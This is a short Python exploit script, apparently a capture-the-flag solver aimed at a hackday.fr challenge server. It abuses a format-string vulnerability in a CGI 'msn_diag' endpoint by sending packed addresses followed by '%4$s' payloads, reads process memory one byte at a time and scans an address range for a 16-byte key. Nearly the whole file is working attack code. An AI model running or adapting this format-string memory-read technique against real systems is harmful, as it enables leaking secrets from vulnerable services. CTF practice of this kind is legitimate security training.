#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return raw

# Let's read the 16 bytes starting at different addresses.
# We'll use %s but we'll try to get around the null bytes by reading with offsets.

def read_memory(addr, length=16):
    buf = b""
    for i in range(length):
        # We put the address at pos 4
        payload = struct.pack('<I', addr + i)
        # Use %4$c to read a single byte (dereferenced char)
        # Wait, standard printf %c takes an int and prints it.
        # %s reads a string.
        # There is no easy way to read a raw byte unless we use something like %s and hope it's not null.
        # But we can use the fact that %s will return at least something if it's not null.
        # If it is null, it's 0x00.
        
        payload = struct.pack('<I', addr + i) + b"%4$s"
        resp = extract_diag(send_msg_raw(payload))
        if resp and resp != b"(null)":
            buf += bytes([resp[0]])
        else:
            buf += b"\x00"
    return buf

# Let's scan a likely range for the key.
# From the previous scan, 0x08049530 seemed to have data.
# Let's scan from 0x08049500 to 0x08049600.

print("=== Scanning specifically for a 16-byte key ===")
for addr in range(0x08049500, 0x08049600, 16):
    data = read_memory(addr, 16)
    print(f"0x{addr:08x}: {data.hex()} | {repr(data)}")

# Let's also check the heap? We need to find the heap address.
# A common trick to find the heap is to look for pointers on the stack.
# Pos 1 was a stack address. Pos 3 was 0x08049530.
# Any other positions?
# result = send_msg("%x." * 100) -> I'll check the output of this again if I could.
